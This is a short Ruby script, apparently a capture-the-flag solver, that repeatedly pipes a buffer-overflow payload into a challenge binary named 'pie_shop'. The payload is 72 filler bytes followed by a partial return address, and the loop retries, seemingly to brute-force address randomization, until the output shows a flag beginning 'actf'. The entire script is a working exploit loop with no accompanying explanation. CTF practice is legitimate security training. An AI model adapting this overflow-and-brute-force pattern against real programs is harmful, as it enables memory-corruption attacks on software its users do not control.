#!/usr/bin/env ruby

while true
	cmd = "python -c \"print('\x01'*72 + '\xa9\xc1\x3a\xb4\x64\x55')\" | pie_shop;"

	result = `#{cmd}`

	puts result
	if result.include? 'actf'
		puts result
		exit
	end
end
